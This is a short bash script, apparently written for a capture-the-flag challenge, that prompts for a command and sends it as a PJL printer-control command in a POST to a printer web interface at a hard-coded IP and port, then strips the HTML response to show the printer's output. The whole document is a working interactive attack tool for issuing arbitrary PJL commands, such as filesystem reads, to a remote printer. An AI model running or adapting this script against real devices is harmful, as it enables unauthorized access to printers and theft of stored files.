echo -n "cmd: "
read cmd
echo ""
curl 'http://46.101.14.236:30509/printer' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Origin: http://46.101.14.236:30509' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Referer: http://46.101.14.236:30509/printer' \
  -H 'Accept-Language: es-ES,es;q=0.9,en-GB;q=0.8,en;q=0.7' \
  --data-raw 'pjl=@PJL'+${cmd// /+} \
  --compressed --insecure -X POST --silent| grep "<p><br/>" | sed 's/<br\/>/\n/g' | grep -v "<p>"
